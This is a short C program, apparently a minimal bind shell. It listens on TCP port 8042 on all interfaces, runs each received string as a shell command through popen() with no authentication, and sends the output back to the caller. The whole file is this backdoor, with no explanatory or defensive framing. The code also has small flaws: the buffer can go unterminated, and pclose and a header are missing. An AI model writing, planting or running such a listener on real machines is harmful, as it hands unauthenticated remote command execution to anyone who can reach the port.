#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    int socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1) {
        puts("Error: Could not create socket!");
        return 2;
    }

    int enable = 1;
    setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));

    struct sockaddr_in server;

    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons(8042);

    if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) == -1) {
        puts("Error: Could not bind the socket!");
        close(socket_desc);
        return 3;    
    }

    listen(socket_desc, 5);

    struct sockaddr_in client;
    socklen_t socklen = sizeof(struct sockaddr_in);
    int new_socket;
    int bytes_count;
    char buf[1024];
    FILE *pipe;
    while (1) {
        memset(buf, 0, sizeof(buf)/sizeof(buf[0]));

        if ((new_socket = accept(socket_desc, (struct sockaddr *) &client, &socklen)) == -1) {
            continue;
        }
        
        bytes_count = recv(new_socket, buf, sizeof(buf)/sizeof(buf[0]), 0);
        pipe = popen(buf, "r");

        while (bytes_count = fread(buf, 1, sizeof(buf)/sizeof(buf[0]), pipe))    {
            write(new_socket, buf, bytes_count);
        }

        close(new_socket);
    }

    close(socket_desc);

    return 0;
}